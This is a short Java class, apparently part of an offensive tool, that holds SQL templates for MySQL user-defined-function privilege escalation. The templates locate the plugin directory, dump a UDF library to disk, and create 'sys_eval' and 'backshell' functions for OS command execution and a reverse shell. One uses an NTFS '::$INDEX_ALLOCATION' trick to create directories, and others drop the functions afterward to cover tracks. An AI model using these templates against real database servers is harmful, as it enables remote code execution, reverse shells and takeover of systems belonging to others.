package Util;

/**
 * @author ch1ng
 * @date 2021/12/18
 */
public class MysqlSqlUtil {

    public static String pluginDirSql = "select @@plugin_dir as plugin_dir;";
    public static String checkSql = "select \"%s\"";
    public static String getInfoSql = "select CONCAT_WS('~',version(), @@version_compile_os, @@version_compile_machine) as udfinfo;";
    public static String udfExportSql = "select %s into dumpfile '%s'";
    public static String createFunctionSql = "create function %s returns string soname '%s';";
    public static String evalSql = "select sys_eval('%s') as s;";
    public static String reverseShellSql = "select backshell('%s','%s') as s;";
    public static String ntfsCreateDirectory = "select '1' into dumpfile '%s::$INDEX_ALLOCATION'";
    public static String cleanSql = "drop function if exists sys_eval;";
    public static String cleanSql2 = "drop function if exists backshell;";

}
